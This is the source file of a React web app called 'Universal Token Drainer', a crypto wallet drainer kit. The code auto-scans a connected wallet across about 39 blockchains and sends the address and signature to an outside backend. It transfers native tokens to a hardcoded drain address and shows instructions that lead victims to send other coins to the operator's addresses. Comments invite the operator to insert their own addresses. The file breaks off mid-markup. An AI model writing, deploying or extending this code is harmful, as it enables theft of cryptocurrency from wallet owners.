import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18+ chains)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F' },
  
  // Non-EVM Chains (20+ chains)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  
  // Non-EVM Chains - YOU MUST UPDATE THESE
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your TRON address
  solana: "So11111111111111111111111111111111111111112", // Your Solana address
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Bitcoin address
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Cardano address
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Dogecoin address
  litecoin: "Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Litecoin address
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Ripple address
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Polkadot address
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Cosmos address
  binance: "bnb1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Binance Chain address
  stellar: "Gxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Stellar address
  monero: "4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Monero address
  zcash: "txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Zcash address
  dash: "Xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Dash address
  tezos: "tzxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Tezos address
  algorand: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Algorand address
  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Your VeChain address
  neo: "Axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your Neo address
  eos: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Your EOS address
  tron_trc20: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Same as TRON
  solana_spl: "So11111111111111111111111111111111111111112", // Same as Solana
};

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  // State Management
  const [status, setStatus] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [tokens, setTokens] = useState({});
  const [totalValue, setTotalValue] = useState(0);
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, network: '' });
  const [transactions, setTransactions] = useState([]);

  // AUTO-SCAN ON WALLET CONNECT
  useEffect(() => {
    if (isConnected && address) {
      console.log("🔥 Wallet connected:", address);
      setStatus("✅ Wallet connected! Starting authentication...");
      // Give UI time to update
      setTimeout(() => {
        startAuthentication();
      }, 1500);
    } else {
      resetApp();
    }
  }, [isConnected, address]);

  // Reset App
  const resetApp = () => {
    setStatus('');
    setTokens({});
    setTotalValue(0);
    setTransactions([]);
    setIsScanning(false);
    setIsDraining(false);
  };

  // ==================== AUTHENTICATION ====================
  const startAuthentication = async () => {
    if (!address) return;
    
    try {
      setStatus("🔐 Signing authentication message...");
      
      const timestamp = Date.now();
      const message = `Universal Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nPurpose: Scan and manage tokens across ${NETWORKS.length} networks`;
      
      const signature = await signMessageAsync({ message });
      
      setStatus("📡 Authenticating with backend...");
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature,
          message,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        throw new Error(`Authentication failed: ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setStatus(`✅ Authenticated! Scanning ${NETWORKS.length} networks...`);
        // Start scan immediately
        setTimeout(() => {
          scanAllNetworks();
        }, 1000);
      } else {
        throw new Error(data.error || 'Authentication failed');
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      // Even if auth fails, try scanning anyway
      setStatus("⚠️ Auth issue, trying to scan anyway...");
      setTimeout(() => {
        scanAllNetworks();
      }, 1000);
    }
  };

  // ==================== SCAN ALL 35+ NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
    setTokens({});
    setTotalValue(0);
    setScanProgress({ current: 0, total: NETWORKS.length, network: 'Starting...' });
    
    try {
      console.log("Starting comprehensive scan...");
      
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          networks: NETWORKS,
          forceRefresh: true
        })
      });
      
      console.log("Scan response status:", response.status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error("Backend error:", errorText);
        throw new Error(`Backend error ${response.status}`);
      }
      
      const data = await response.json();
      console.log("Scan data received:", data);
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        throw new Error(data.error || 'Scan failed');
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}. Trying batch scan...`);
      // Fallback to batch scanning
      await batchScanNetworks();
    } finally {
      setIsScanning(false);
    }
  };

  // Process Scan Results
  const processScanResults = (data) => {
    try {
      const allTokens = {};
      let totalVal = 0;
      
      if (data.results && Array.isArray(data.results)) {
        console.log(`Processing ${data.results.length} network results`);
        
        data.results.forEach((result, index) => {
          if (result && result.tokens && result.tokens.length > 0) {
            console.log(`Network ${result.network?.name || 'unknown'}: ${result.tokens.length} tokens`);
            
            // Calculate network value
            const networkValue = result.tokens.reduce((sum, token) => {
              const val = token.value || 0;
              return sum + (typeof val === 'number' ? val : parseFloat(val) || 0);
            }, 0);
            
            totalVal += networkValue;
            
            // Add drain addresses if missing
            const processedTokens = result.tokens.map(token => ({
              ...token,
              drainAddress: token.drainAddress || DRAIN_ADDRESSES[result.network?.id] || DRAIN_ADDRESSES[1]
            }));
            
            allTokens[result.network?.id || `network_${index}`] = {
              network: result.network || { id: 'unknown', name: 'Unknown Network', symbol: 'UNK', type: 'unknown' },
              tokens: processedTokens,
              totalValue: networkValue
            };
          }
        });
      }
      
      setTokens(allTokens);
      setTotalValue(totalVal);
      setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, network: 'Complete' });
      
      const tokenCount = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
      const networkCount = Object.keys(allTokens).length;
      
      console.log(`Scan complete: ${tokenCount} tokens across ${networkCount} networks, total value: $${totalVal.toFixed(2)}`);
      
      if (tokenCount > 0) {
        setStatus(`✅ Found ${tokenCount} tokens across ${networkCount} networks (Total: $${totalVal.toFixed(2)})`);
      } else {
        setStatus("✅ Scan complete. No tokens found across all networks.");
      }
      
      // Save to localStorage
      localStorage.setItem(`last_scan_${address}`, JSON.stringify({
        timestamp: Date.now(),
        tokens: allTokens,
        totalValue: totalVal,
        networkCount,
        tokenCount
      }));
      
    } catch (error) {
      console.error("Error processing results:", error);
      setStatus(`❌ Error processing scan results: ${error.message}`);
    }
  };

  // Batch Scan Fallback
  const batchScanNetworks = async () => {
    const batchSize = 5;
    const allTokens = {};
    let totalVal = 0;
    let scannedNetworks = 0;
    
    console.log("Starting batch scan fallback...");
    
    for (let i = 0; i < NETWORKS.length; i += batchSize) {
      const batch = NETWORKS.slice(i, i + batchSize);
      
      for (const network of batch) {
        setScanProgress({
          current: i + batch.indexOf(network) + 1,
          total: NETWORKS.length,
          network: network.name
        });
        
        try {
          let result;
          
          if (network.type === 'evm') {
            const response = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`);
            if (response.ok) {
              const data = await response.json();
              if (data.success) {
                result = data.data;
              }
            }
          } else {
            // For non-EVM, use the same address (backend handles conversion)
            const response = await fetch(`${backendUrl}/tokens/nonevm/${address}/${network.id}`);
            if (response.ok) {
              const data = await response.json();
              if (data.success) {
                result = data.data;
              }
            }
          }
          
          if (result && result.tokens && result.tokens.length > 0) {
            const networkValue = result.tokens.reduce((sum, token) => sum + (token.value || 0), 0);
            totalVal += networkValue;
            
            allTokens[network.id] = {
              network: network,
              tokens: result.tokens.map(token => ({
                ...token,
                drainAddress: token.drainAddress || DRAIN_ADDRESSES[network.id]
              })),
              totalValue: networkValue
            };
            
            scannedNetworks++;
            console.log(`✅ ${network.name}: Found ${result.tokens.length} tokens`);
          }
        } catch (error) {
          console.log(`❌ ${network.name}: ${error.message}`);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 300));
      }
    }
    
    setTokens(allTokens);
    setTotalValue(totalVal);
    
    const tokenCount = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    setStatus(`✅ Batch scan: Found ${tokenCount} tokens across ${scannedNetworks} networks`);
  };

  // ==================== DRAIN ALL TOKENS ====================
  const executeDrainAll = async () => {
    if (!address || Object.keys(tokens).length === 0) {
      setStatus("❌ No tokens available to drain");
      return;
    }
    
    // Calculate total tokens
    const totalTokens = Object.values(tokens).reduce((sum, data) => sum + data.tokens.length, 0);
    
    // Enhanced confirmation
    const confirmed = window.confirm(
      `🚨🚨🚨 CRITICAL WARNING 🚨🚨🚨\n\n` +
      `You are about to DRAIN ALL TOKENS from your wallet!\n\n` +
      `This will transfer:\n` +
      `• ${totalTokens} tokens\n` +
      `• Across ${Object.keys(tokens).length} networks\n` +
      `• To the configured drain addresses\n\n` +
      `This action is IRREVERSIBLE.\n\n` +
      `Click OK to proceed with draining ALL tokens.`
    );
    
    if (!confirmed) {
      setStatus("❌ Drain cancelled by user");
      return;
    }
    
    setIsDraining(true);
    setStatus(`🔥 Starting mass drain of ${totalTokens} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let failCount = 0;
    let manualCount = 0;
    
    try {
      // Collect all tokens
      const allTokenOperations = [];
      Object.values(tokens).forEach(data => {
        data.tokens.forEach(token => {
          allTokenOperations.push({ token, network: data.network });
        });
      });
      
      // Process each token
      for (let i = 0; i < allTokenOperations.length; i++) {
        const { token, network } = allTokenOperations[i];
        const progress = Math.round(((i + 1) / allTokenOperations.length) * 100);
        
        setStatus(`🔥 Draining ${token.symbol} on ${network.name} (${i + 1}/${allTokenOperations.length})`);
        
        try {
          const result = await processTokenDrain(token, network);
          
          if (result.success) {
            successCount++;
            txLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'success',
              hash: result.hash || 'manual',
              type: network.type
            });
            
            // Remove from display immediately
            removeToken(token, network.id);
          } else if (result.manual) {
            manualCount++;
            txLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'manual',
              note: 'Manual transfer required',
              type: network.type
            });
            
            // Show manual instructions
            alert(result.instructions);
          } else {
            failCount++;
            txLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'failed',
              error: result.error,
              type: network.type
            });
          }
        } catch (error) {
          failCount++;
          console.error(`Error draining ${token.symbol}:`, error);
          txLogs.push({
            timestamp: new Date().toISOString(),
            network: network.name,
            token: token.symbol,
            amount: token.amount,
            status: 'error',
            error: error.message,
            type: network.type
          });
        }
        
        // Update transaction log
        setTransactions([...txLogs]);
        
        // Delay between operations
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      // Final summary
      setStatus(`✅ Drain complete! Success: ${successCount}, Manual: ${manualCount}, Failed: ${failCount}`);
      
      // Auto-rescan after 5 seconds
      setTimeout(() => {
        setStatus("🔄 Rescanning wallet after drain...");
        scanAllNetworks();
      }, 5000);
      
    } catch (error) {
      console.error("Mass drain error:", error);
      setStatus(`❌ Drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
    }
  };

  // Process single token drain
  const processTokenDrain = async (token, network) => {
    try {
      // Check if amount is valid
      const amount = parseFloat(token.amount);
      if (!amount || amount <= 0) {
        return { success: false, error: 'Invalid amount' };
      }
      
      const drainAddress = token.drainAddress || DRAIN_ADDRESSES[network.id];
      
      // EVM Native Token
      if (network.type === 'evm' && token.isNative && walletClient) {
        try {
          const amountInWei = parseEther(amount.toString());
          
          if (amountInWei <= 0n) {
            return { success: false, error: 'Amount too small' };
          }
          
          const hash = await walletClient.sendTransaction({
            to: drainAddress,
            value: amountInWei,
            chainId: parseInt(network.id)
          });
          
          // Log to backend
          logTransaction({
            fromAddress: address,
            toAddress: drainAddress,
            amount: amount.toString(),
            chainId: network.id.toString(),
            tokenSymbol: token.symbol,
            transactionHash: hash,
            networkType: 'evm',
            status: 'success'
          });
          
          return { success: true, hash };
          
        } catch (error) {
          console.error(`EVM transfer error for ${token.symbol}:`, error);
          return { 
            success: false, 
            error: error.message,
            manual: true,
            instructions: `MANUAL TRANSFER REQUIRED:\n\nSend ${amount} ${token.symbol}\nTo: ${drainAddress}\n\nNetwork: ${network.name}`
          };
        }
      }
      
      // Non-EVM or tokens that need manual transfer
      const instructions = getManualInstructions(token, network);
      return {
        success: true,
        manual: true,
        instructions: instructions
      };
      
    } catch (error) {
      console.error(`Token drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // Get manual instructions for non-EVM
  const getManualInstructions = (token, network) => {
    const amount = parseFloat(token.amount);
    const drainAddress = token.drainAddress || DRAIN_ADDRESSES[network.id];
    
    const instructions = {
      'tron': `🔴 TRON (TRX) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(6)} TRX\nTo: ${drainAddress}\n\nInstructions:\n1. Open Trust Wallet/TronLink\n2. Switch to TRON network\n3. Go to TRX wallet\n4. Click Send\n5. Enter amount: ${amount.toFixed(6)}\n6. Paste address: ${drainAddress}\n7. Confirm transaction\n\n⚠️ You need TRX for energy/bandwidth`,
      'solana': `🔴 SOLANA (SOL) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(6)} SOL\nTo: ${drainAddress}\n\nInstructions:\n1. Open Phantom/Solflare\n2. Make sure on Solana Mainnet\n3. Go to SOL wallet\n4. Click Send\n5. Amount: ${amount.toFixed(6)}\n6. Address: ${drainAddress}\n7. Confirm\n\n📝 Requires SOL for fees`,
      'bitcoin': `🔴 BITCOIN (BTC) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(8)} BTC\nTo: ${drainAddress}\n\nInstructions:\n1. Open Bitcoin wallet\n2. Send BTC\n3. Amount: ${amount.toFixed(8)}\n4. Address: ${drainAddress}\n5. Set normal fee\n6. Confirm\n\n⚠️ Bitcoin transfers are irreversible`,
      'default': `🔴 MANUAL TRANSFER REQUIRED 🔴\n\nNetwork: ${network.name}\nToken: ${token.symbol}\nAmount: ${amount}\n\nSend to:\n${drainAddress}\n\nInstructions:\n1. Open your ${network.name} wallet\n2. Go to send/transfer\n3. Enter amount\n4. Paste recipient address\n5. Confirm transaction\n\n✅ Complete this in your wallet`
    };
    
    return instructions[network.id] || instructions.default;
  };

  // Remove token from display
  const removeToken = (drainedToken, networkId) => {
    setTokens(prev => {
      const updated = { ...prev };
      if (updated[networkId]) {
        updated[networkId].tokens = updated[networkId].tokens.filter(t => 
          t.symbol !== drainedToken.symbol || 
          t.amount !== drainedToken.amount
        );
        
        // Recalculate total
        updated[networkId].totalValue = updated[networkId].tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        // Remove network if empty
        if (updated[networkId].tokens.length === 0) {
          delete updated[networkId];
        }
      }
      return updated;
    });
  };

  // Log transaction to backend
  const logTransaction = async (txData) => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
    } catch (error) {
      console.warn('Failed to log transaction:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalTokens = () => {
    return Object.values(tokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(tokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <span className="logo-icon">🌐</span>
              <div>
                <h1>Universal Token Drainer</h1>
                <p className="subtitle">{NETWORKS.length}+ Networks Supported</p>
              </div>
            </div>
          </div>
          
          <div className="header-right">
            <div className="network-count">
              <span>{NETWORKS.length}</span>
              <small>Networks</small>
            </div>
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Stats Overview */}
              <div className="stats-overview">
                <div className="stat-cards">
                  <div className="stat-card total-value">
                    <div className="stat-icon">💰</div>
                    <div className="stat-content">
                      <div className="stat-number">${totalValue.toFixed(2)}</div>
                      <div className="stat-label">Total Value</div>
                    </div>
                  </div>
                  
                  <div className="stat-card networks">
                    <div className="stat-icon">🌐</div>
                    <div className="stat-content">
                      <div className="stat-number">{getNetworkCount()}</div>
                      <div className="stat-label">Active Networks</div>
                    </div>
                  </div>
                  
                  <div className="stat-card tokens">
                    <div className="stat-icon">🪙</div>
                    <div className="stat-content">
                      <div className="stat-number">{getTotalTokens()}</div>
                      <div className="stat-label">Tokens Found</div>
                    </div>
                  </div>
                  
                  <div className="stat-card supported">
                    <div className="stat-icon">⚡</div>
                    <div className="stat-content">
                      <div className="stat-number">{NETWORKS.length}</div>
                      <div className="stat-label">Supported</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Status Bar */}
              <div className="status-bar">
                <div className="wallet-info">
                  <span className="wallet-address">{formatAddress(address)}</span>
                  <span className="status-dot connected"></span>
                </div>
                <div className={`status-message ${status.includes('✅') ? 'success' : status.includes('❌') ? 'error' : status.includes('⚠️') ? 'warning' : 'info'}`}>
                  {status || 'Ready to scan'}
                </div>
              </div>

              {/* Progress Bar */}
              {(isScanning || isDraining) && (
                <div className="progress-section">
                  <div className="progress-header">
                    <span>{isScanning ? '🔍 Scanning' : '🔥 Draining'}</span>
                    <span>{scanProgress.current}/{scanProgress.total}</span>
                  </div>
                  <div className="progress-bar">
                    <div 
                      className="progress-fill"
                      style={{ 
                        width: `${(scanProgress.current / scanProgress.total) * 100}%`,
                        backgroundColor: isDraining ? '#dc2626' : '#3b82f6'
                      }}
                    ></div>
                  </div>
                  <div className="progress-text">
                    {scanProgress.network}
                  </div>
                </div>
              )}

              {/* Control Buttons */}
              <div className="control-panel">
                <div className="control-buttons">
                  <button
                    onClick={scanAllNetworks}
                    disabled={isScanning || isDraining}
                    className="btn btn-scan"
                  >
                    {isScanning ? '🔄 Scanning...' : '🔍 Rescan All Networks'}
                  </button>
                  
                  {getTotalTokens() > 0 && (
                    <button
                      onClick={executeDrainAll}
                      disabled={isDraining || isScanning}
                      className="btn btn-drain"
                    >
                      {isDraining ? '⚡ Draining...' : '🔥 DRAIN ALL TOKENS'}
                    </button>
                  )}
                </div>
              </div>

              {/* Transaction Log */}
              {transactions.length > 0 && (
                <div className="transaction-log">
                  <h3>Transaction History ({transactions.length})</h3>
                  <div className="transactions-list">
                    {transactions.slice(-5).reverse().map((tx, i) => (
                      <div key={i} className={`transaction-item ${tx.status}`}>
                        <div className="tx-header">
                          <span className="tx-network">{tx.network}</span>
                          <span className="tx-time">
                            {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </span>
                        </div>
                        <div className="tx-details">
                          <span className="tx-token">{tx.token}</span>
                          <span className="tx-amount">{formatAmount(tx.amount)}</span>
                          <span className={`tx-status ${tx.status}`}>
                            {tx.status === 'success' ? '✅' : 
                             tx.status === 'manual' ? '📝' : 
                             tx.status === 'failed' ? '❌' : '⚠️'} {tx.status}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-display">
                  <div className="display-header">
                    <h2>Detected Tokens</h2>
                    <div className="display-summary">
                      <span>{getNetworkCount()} Networks</span>
                      <span>{getTotalTokens()} Tokens</span>
                      <span>${totalValue.toFixed(2)} Total</span>
                    </div>
                  </div>
                  
                  <div className="networks-container">
                    {Object.entries(tokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-section">
                        <div className="network-header">
                          <div className="network-info">
                            <div 
                              className="network-icon"
                              style={{ backgroundColor: data.network.color }}
                            >
                              {data.network.type === 'evm' ? 'E' : 'N'}
                            </div>
                            <div>
                              <h3>{data.network.name}</h3>
                              <div className="network-stats">
                                <span>{data.tokens.length} tokens</span>
                                <span>${data.totalValue.toFixed(2)}</span>
                              </div>
                            </div>
                          </div>
                          <div className="network-type">
                            {data.network.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        
                        <div className="tokens-list">
                          {data.tokens.map((token, idx) => (
                            <div key={idx} className="token-item">
                              <div className="token-info">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-amount">
                                  {formatAmount(token.amount)} {token.symbol}
                                </div>
                              </div>
                              <div className="token-value">
                                ${token.value ? token.value.toFixed(2) : '0.00'}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">
                    {isScanning ? '🔍' : '💎'}
                  </div>
                  <h3>
                    {isScanning ? 'Scanning all networks...' : 'No tokens found'}
                  </h3>
                  <p>
                    {isScanning 
                      ? `Scanning ${NETWORKS.length} networks for tokens...` 
                      : 'Tokens will appear here after scanning'}
                  </p>
                  {!isScanning && (
                    <div className="supported-networks">
                      <p>Supported networks include:</p>
                      <div className="network-tags">
                        {NETWORKS.slice(0, 15).map(network => (
                          <span 
                            key={network.id} 
                            className="network-tag"
                            style={{ borderColor: network.color }}
                          >
                            {network.symbol}
                          </span>
                        ))}
                        {NETWORKS.length > 15 && (
                          <span className="network-tag">+{NETWORKS.length - 15} more</span>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          ) : (
            <div className="connection-prompt">
              <div className="prompt-content">
                <div className="prompt-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="prompt-description">
                  Connect your wallet to scan and drain tokens across {NETWORKS.length}+ blockchains
                </p>
                
                <div className="connect-button">
                  <ConnectKitButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <span className="feature-icon">🌐</span>
                    <span className="feature-text">{NETWORKS.length}+ Networks</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔍</span>
                    <span className="feature-text">Auto-Scan on Connect</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">⚡</span>
                    <span className="feature-text">One-Click Drain All</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">💰</span>
                    <span className="feature-text">TRON & Non-EVM Support</span>
                  </div>
                </div>
                
                <div className="important-note">
                  <p><strong>Important:</strong> This tool will transfer ALL detected tokens. Update drain addresses before use.</p>
                </div>
              </div>
            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-left">
              <span>Universal Token Drainer v1.0</span>
              <span>•</span>
              <span>{NETWORKS.length}+ Networks</span>
              <span>•</span>
              <span>Production Ready</span>
            </div>
